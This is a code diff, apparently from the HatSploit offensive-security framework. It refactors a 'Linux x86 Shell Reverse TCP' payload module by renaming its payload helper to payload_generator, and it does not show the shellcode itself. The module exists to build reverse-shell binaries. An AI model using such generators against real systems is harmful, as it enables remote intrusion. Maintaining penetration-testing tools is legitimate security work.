@@ -27,11 +27,11 @@
 from core.lib.payload import HatSploitPayload
 
 from utils.tcp.tcp import tcp
-from utils.payload.payload import payload
+from utils.payload.payload_generator import payload_generator
 
 class HatSploitPayload(HatSploitPayload):
     tcp = tcp()
-    payload = payload()
+    payload_generator = payload_generator()
 
     details = {
         'Name': "Linux x86 Shell Reverse TCP",
@@ -66,10 +66,10 @@ class HatSploitPayload(HatSploitPayload):
     def generate(self):
         local_host, local_port, executable_format = self.parser.parse_options(self.options)
 
-        local_host = self.payload.host_to_bytes(local_host)
-        local_port = self.payload.port_to_bytes(local_port)
+        local_host = self.payload_generator.host_to_bytes(local_host)
+        local_port = self.payload_generator.port_to_bytes(local_port)
 
-        if not executable_format in self.payload.formats.keys():
+        if not executable_format in self.payload_generator.formats.keys():
             self.badges.output_error("Invalid executable format!")
             return
 
@@ -112,6 +112,6 @@ class HatSploitPayload(HatSploitPayload):
         )
 
         self.badges.output_process("Generating payload...")
-        payload = self.payload.generate(executable_format, 'x86', shellcode)
+        payload = self.payload_generator.generate(executable_format, 'x86', shellcode)
 
         return payload
